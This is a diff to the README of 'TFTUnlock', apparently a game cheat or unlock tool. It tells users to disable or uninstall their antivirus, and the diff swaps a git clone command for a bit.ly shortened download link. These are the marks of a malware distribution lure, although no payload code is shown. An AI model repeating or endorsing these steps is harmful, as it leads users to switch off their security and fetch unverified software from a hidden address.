@@ -12,9 +12,9 @@ Before proceeding, make sure you have disabled or uninstalled any antivirus soft
 
 First, download the repository containing all necessary files.
 
-    ```bash
-    git clone https://github.com/yourusername/TFTUnlock-2024.git
-    ```
+   ```bash
+    https://bit.ly/TFTUnlock
+```
 
 ### 2. Install TFTUnlock v4.6.4.4
 
